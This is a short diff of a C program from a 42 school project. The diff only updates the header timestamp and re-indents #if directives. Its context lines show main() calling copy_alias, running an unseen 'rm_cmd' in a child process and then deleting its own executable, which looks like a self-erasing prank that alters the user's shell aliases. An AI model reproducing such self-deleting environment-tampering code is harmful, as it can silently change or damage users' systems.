@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/06/22 01:28:09 by mgama             #+#    #+#             */
-/*   Updated: 2023/06/22 03:43:31 by mgama            ###   ########.fr       */
+/*   Updated: 2023/06/25 14:22:58 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -47,11 +47,11 @@ int	main(int ac, char **av, char **envp)
 	realpath(av[0], home_buffer);
 	printf("currrent file path = %s\n", home_buffer);
 	copy_alias(envp);
-	#if __APPLE__
+#if __APPLE__
 	process_child(rm_cmd, envp);
-	#else
+#else
 	system("gnome-terminal");
-	#endif /* __APPLE__ */
+#endif /* __APPLE__ */
 	remove(home_buffer);
 	return (0);
 }
